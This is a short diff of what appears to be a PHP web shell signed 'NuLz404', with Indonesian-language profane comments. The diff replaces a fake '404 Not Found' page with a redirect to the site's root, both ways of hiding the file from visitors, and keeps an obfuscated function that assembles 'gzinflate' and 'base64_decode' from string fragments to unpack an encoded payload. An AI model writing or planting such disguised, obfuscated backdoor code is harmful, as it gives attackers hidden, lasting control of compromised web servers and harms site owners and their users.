@@ -2,17 +2,10 @@
 //NuLz404
 //Kalo Recode Nama gw jangan di Apus anjing
 //Kontol Lu Semua
-header("HTTP/1.0 404 Not Found");
-echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html><head>
-<title>404 Not Found</title>
-</head><body>
-<h1>Not Found</h1>
-<p>The requested URL was not found on this server.</p>
-<hr>
-<address>'.$_SERVER["SERVER_SOFTWARE"].' ('.PHP_OS.') Server at '.$_SERVER["HTTP_HOST"].'</address>
-</body></html>
-';
+$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+$domainUrl = $protocol . '://' . $_SERVER['HTTP_HOST'] . '/';
+header("Location: $domainUrl");
+
 function Ikg($vHjCLy){
     $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
     $b64 = 'b'.'ase'.'6'.'4'.'_'.'de'.'co'.'de';
